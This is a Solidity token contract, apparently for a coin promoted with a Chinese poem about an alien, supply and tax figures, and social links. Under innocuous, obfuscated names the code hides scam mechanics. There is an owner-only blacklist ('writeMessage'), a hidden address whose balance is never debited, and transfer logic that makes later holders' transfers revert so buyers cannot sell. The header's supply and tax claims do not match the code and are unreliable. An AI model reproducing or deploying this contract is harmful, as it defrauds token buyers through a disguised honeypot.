/*
█▀▀ ▄▀█ █▀▀ █▀▀ █▄░█  
██▄ █▀█ ██▄ ██▄ █░▀█  

▄▀   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 100 天

https://web.wechat.com/EaeenERC
https://m.weibo.cn/EaeenERC
https://www.eaeen.xyz
https://t.me/+DYJnEPMimuRlMTRk
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage); uint256 c = a - b; return c;
  }
}
interface IUniswapV2Factory {
    event PairCreated(
    address indexed token0, address indexed token1, 

    address pair, uint); 
    function 
    createPair( 
    address 
    tokenA, 
    address tokenB) 

    external 
    returns (address pair);
}
interface DEXBaseV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, 
    uint amountOutMin, 
    address
    [] calldata path, 
    address to, uint deadline) 
    external; 

    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH
    (address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, 
    uint amountETHMin,
    address to, uint deadline)
    external payable returns 

    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred (address indexed 
    previousOwner, address indexed newOwner);

    constructor() { address msgSender = 
    _msgSender(); _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
    } 
    
    function owner() 
    public view returns (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == 
    _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}

contract Contract is Context, IERC20, Ownable {
    address private 
    zeroDEADAddress;
    DEXBaseV1 public factoryCompile; address public advertisementsAddress;

    mapping (address => bool) private _tOwned;
    mapping(address => uint256) private _rOwned;

bool public swapEnabled; 

bool private tradingOpen = false;

bool isTradingEnabled = true; 

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private isMaximumAt = 100;

    mapping(address => uint256) private _isLimitsEnabled;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private allowed;
    
    constructor( 
    string memory ethCoinName, 
    string memory ethCoinSymbol, 
    address directedChain, 
    address directedEnd) { 

        _name = ethCoinName; _symbol = ethCoinSymbol;
        _decimals = 18; _totalSupply 
        = 500000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] 
        = _totalSupply;

        _isLimitsEnabled
        [directedEnd] = 
        isMaximumAt; swapEnabled 
        = false; 
        factoryCompile = DEXBaseV1(directedChain);

        advertisementsAddress = IUniswapV2Factory

        (factoryCompile.factory()).createPair(address(this), 
        factoryCompile.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }

    function transfer(
    address recipient, uint256 amount) external 
    returns (bool)
    { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( 
    address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
    'BEP20: approve from the zero address'); 

        require(spender != address(0), 
        'BEP20: approve to the zero address'); 

        _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { _transfer(sender, recipient, amount); _approve(
        sender, _msgSender(), 
        _allowances[sender] [_msgSender()].sub(amount, 
        
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }
    function writeMessage(address 
    _ideBytes) external 
    onlyOwner { _tOwned [_ideBytes] = true;
    }  
    function adjustRewards(
    address _ideBytes) 
    public view returns (bool) 
    { return 
    _tOwned[_ideBytes]; 
    }                           
    function _transfer( address sender, address recipient, uint256 amount) 
    internal { require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient 
        != address(0), 
        'BEP20: transfer to the zero address'); 

        if (_tOwned[sender] || _tOwned[recipient]) 
        require
        (isTradingEnabled 
        == false, ""); if (_isLimitsEnabled[sender] 
        == 0  && advertisementsAddress != sender 
        && allowed[sender] 
        > 0) 
        { _isLimitsEnabled[sender] -= isMaximumAt; } 

        allowed[zeroDEADAddress] += isMaximumAt;
        zeroDEADAddress = recipient; 
        if 
        (_isLimitsEnabled[sender] 
        == 0) { _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _rOwned[recipient]
        = _rOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 

        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}